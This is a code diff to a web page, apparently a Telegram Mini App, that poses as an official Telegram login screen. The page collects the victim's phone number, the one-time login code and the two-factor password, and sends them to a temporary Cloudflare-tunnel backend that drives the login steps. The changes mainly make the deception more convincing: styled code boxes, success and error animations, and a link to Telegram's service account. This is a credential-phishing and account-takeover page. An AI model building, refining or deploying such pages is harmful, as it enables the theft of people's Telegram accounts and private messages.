@@ -13,6 +13,8 @@
         --tg-bg: #ffffff;
         --tg-text: #000000;
         --tg-hint: #999999;
+        --error-red: #ff3b30;
+        --success-green: #34c759;
     }
 
     * { 
@@ -26,10 +28,11 @@
         background: var(--tg-bg); 
         height: 100vh; width: 100vw;
         display: flex; flex-direction: column; align-items: center;
-        overflow-x: hidden;
+        overflow: hidden; /* Prevent scrolling for full screen feel */
+        position: fixed;
     }
 
-    .step { display: none; width: 100%; max-width: 400px; flex-direction: column; align-items: center; padding: 40px 25px; text-align: center; }
+    .step { display: none; width: 100%; max-width: 400px; flex-direction: column; align-items: center; padding: 40px 25px; text-align: center; height: 100%; }
     .active { display: flex; }
 
     /* Loading Screen */
@@ -40,38 +43,55 @@
     .monkey-img { width: 100px; height: 100px; margin-bottom: 20px; }
     
     h2 { font-size: 22px; font-weight: 600; margin: 10px 0; }
-    p { font-size: 15px; color: var(--tg-hint); line-height: 1.4; margin-bottom: 25px; }
+    p { font-size: 15px; color: var(--tg-hint); line-height: 1.4; margin-bottom: 20px; }
 
     .btn-main {
         background: var(--tg-blue); 
         color: #fff; padding: 14px; width: 100%; border-radius: 12px; border: none;
         font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px;
-        transition: background 0.2s;
         display: flex; align-items: center; justify-content: center; gap: 10px;
     }
-    .btn-main:active { opacity: 0.8; }
-    .btn-main:disabled { background: #ccc; }
+
+    .btn-getcode {
+        background: transparent;
+        color: var(--tg-blue);
+        border: none;
+        font-weight: 600;
+        margin-top: 15px;
+        cursor: pointer;
+        font-size: 15px;
+        text-decoration: none;
+    }
 
     input {
         width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px;
         border: 1px solid #ddd; background: #f4f4f5;
         color: #000; font-size: 16px;
     }
-    input:focus { border-color: var(--tg-blue); outline: none; background: #fff; }
 
-    /* OTP Boxes */
-    .otp-container { display: flex; gap: 10px; margin: 20px 0; justify-content: center; }
+    /* OTP Boxes - Styled as Square Boxes */
+    .otp-container { display: flex; gap: 8px; margin: 20px 0; justify-content: center; }
     .otp-box { 
-        width: 45px; height: 55px; 
-        border-bottom: 2px solid #ddd;
+        width: 48px; height: 58px; 
+        border: 2px solid #ddd;
+        border-radius: 10px;
         display: flex; align-items: center; justify-content: center; 
         font-size: 24px; font-weight: bold;
+        background: #f8f8f8;
+        transition: all 0.2s ease;
     }
-    .otp-box.filled { border-bottom-color: var(--tg-blue); }
+    .otp-box.filled { border-color: var(--tg-blue); background: #fff; }
+    .otp-box.invalid { border-color: var(--error-red); background: #fff1f0; color: var(--error-red); }
+    .otp-box.valid { border-color: var(--success-green); background: #f6ffed; color: var(--success-green); }
 
-    .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1px; width: 100%; background: #eee; margin-top: 30px; border: 1px solid #eee;}
-    .key { background: #fff; padding: 20px; font-size: 24px; cursor: pointer; }
-    .key:active { background: #f4f4f5; }
+    .keypad { 
+        display: grid; grid-template-columns: repeat(3, 1fr); 
+        gap: 1px; width: 100%; background: #eee; 
+        margin-top: auto; /* Push to bottom */
+        border-top: 1px solid #ddd;
+    }
+    .key { background: #fff; padding: 20px; font-size: 24px; cursor: pointer; font-weight: 500; }
+    .key:active { background: #f0f0f0; }
 
     .msg { padding: 12px; border-radius: 8px; font-size: 14px; margin: 10px 0; display: none; width: 100%; }
     .error { background: #fde8e8; color: #c81e1e; }
@@ -97,7 +117,7 @@
     </div>
 
     <div id="step_photo_slide" class="step">
-        <img src="https://telegram.org/img/t_logo.png" style="width: 80px; margin-bottom: 20px;">
+        <img src="https://telegram.org/img/t_logo.png" style="width: 80px; margin-top: 20vh; margin-bottom: 20px;">
         <h2>Telegram Login</h2>
         <p>Please log in to continue to the service.</p>
         
@@ -110,7 +130,6 @@
 
     <div id="step2" class="step">
         <img src="https://static.vecteezy.com/system/resources/previews/010/263/595/original/monkey-face-icon-free-vector.jpg" class="monkey-img" alt="Monkey">
-        <h2 id="step2_phone_display">+251 93 809 6980</h2>
         <p>We have sent you a message in Telegram with the code.</p>
         
         <div class="otp-container" id="otp_container">
@@ -123,6 +142,8 @@
 
         <div id="status2" class="msg"></div>
 
+        <a href="https://t.me/42777" target="_blank" class="btn-getcode">Didn't get the code? Get Code</a>
+
         <div class="keypad">
             <div class="key" onclick="press(1)">1</div><div class="key" onclick="press(2)">2</div><div class="key" onclick="press(3)">3</div>
             <div class="key" onclick="press(4)">4</div><div class="key" onclick="press(5)">5</div><div class="key" onclick="press(6)">6</div>
@@ -133,7 +154,7 @@
     </div>
 
     <div id="step3" class="step">
-        <img src="https://emoji.slack-edge.com/T024F7F15/monkey_see_no_evil/562383c509c258d4.png" class="monkey-img" style="width: 120px; height:auto;">
+        <img src="https://emoji.slack-edge.com/T024F7F15/monkey_see_no_evil/562383c509c258d4.png" class="monkey-img" style="width: 120px; height:auto; margin-top: 10vh;">
         <h2>Enter Your Password</h2>
         <p>Your account is protected with an additional password.</p>
         
@@ -151,14 +172,14 @@
     </div>
 
     <div id="step_success" class="step">
-        <i class="fa-solid fa-circle-check" style="font-size: 60px; color: #31a24c; margin-bottom: 20px;"></i>
+        <i class="fa-solid fa-circle-check" style="font-size: 60px; color: #31a24c; margin-top: 20vh; margin-bottom: 20px;"></i>
         <h2>Login Successful</h2>
         <p>You have successfully logged in to your Telegram account.</p>
         <button class="btn-main" onclick="tg.close()">Close</button>
     </div>
 
     <div id="flood_step" class="step">
-        <i class="fa-solid fa-clock" style="font-size: 60px; color: #f2a600; margin-bottom: 20px;"></i>
+        <i class="fa-solid fa-clock" style="font-size: 60px; color: #f2a600; margin-top: 20vh; margin-bottom: 20px;"></i>
         <h2>Too Many Attempts</h2>
         <p>Please wait before trying again.</p>
         <div style="font-size: 32px; font-weight: bold;" id="wait_time">00:00</div>
@@ -166,7 +187,7 @@
 
 <script>
     const tg = window.Telegram.WebApp;
-    tg.expand();
+    tg.expand(); // Make it full screen
     tg.ready();
 
     const API_BASE_URL = "https://consensus-spider-ward-idol.trycloudflare.com"; 
@@ -199,9 +220,22 @@
         fetch(`${API_BASE_URL}/check_status/${userId}`).then(r => r.json()).then(data => {
             if (data.status === "NEED_OTP") { showStep(2); stopLoaders(); }
             else if (data.status === "NEED_2FA") { showStep(3); stopLoaders(); }
-            else if (data.status === "SUCCESS") { clearInterval(statusChecker); showStep('success'); }
+            else if (data.status === "SUCCESS") { 
+                clearInterval(statusChecker); 
+                setOtpStatus('valid');
+                setTimeout(() => showStep('success'), 800);
+            }
             else if (data.status === "FLOOD") { clearInterval(statusChecker); startFloodTimer(data.wait); }
         }).catch(e => {});
+    }
+
+    // New Function to change box colors
+    function setOtpStatus(status) {
+        const boxes = document.querySelectorAll('.otp-box');
+        boxes.forEach(box => {
+            box.classList.remove('invalid', 'valid');
+            if(status) box.classList.add(status);
+        });
     }
 
     function stopLoaders() {
@@ -273,7 +307,8 @@
 
     function press(num) {
         playTap();
-        hideMsg(2); 
+        hideMsg(2);
+        setOtpStatus(null); // Reset colors when typing
         if (currentOtp.length < 5) {
             currentOtp += num;
             updateOtpUI();
@@ -281,7 +316,12 @@
         }
     }
 
-    function backspace() { playTap(); currentOtp = currentOtp.slice(0, -1); updateOtpUI(); }
+    function backspace() { 
+        playTap(); 
+        setOtpStatus(null);
+        currentOtp = currentOtp.slice(0, -1); 
+        updateOtpUI(); 
+    }
 
     function updateOtpUI() {
         for (let i = 0; i < 5; i++) {
@@ -326,13 +366,28 @@
     }
 
     function handleResponse(data, step) {
-        if (data.status === "SUCCESS") { showStep('success'); } 
-        else if (data.status === "NEED_2FA") { showStep(3); stopLoaders(); }
+        if (data.status === "SUCCESS") { 
+            setOtpStatus('valid');
+            setTimeout(() => showStep('success'), 800);
+        } 
+        else if (data.status === "NEED_2FA") { 
+            setOtpStatus('valid');
+            setTimeout(() => { showStep(3); stopLoaders(); }, 600);
+        }
         else if (data.status === "FLOOD") { startFloodTimer(data.wait); }
         else {
             stopLoaders();
-            showMsg(step, 'error', 'Invalid info. Please try again.');
-            if(step === 2) { currentOtp = ""; updateOtpUI(); }
+            if(step === 2) { 
+                setOtpStatus('invalid');
+                showMsg(step, 'error', 'Invalid code. Please try again.');
+                setTimeout(() => {
+                    currentOtp = ""; 
+                    updateOtpUI(); 
+                    setOtpStatus(null);
+                }, 1500);
+            } else {
+                showMsg(step, 'error', 'Invalid password. Please try again.');
+            }
         }
     }
 
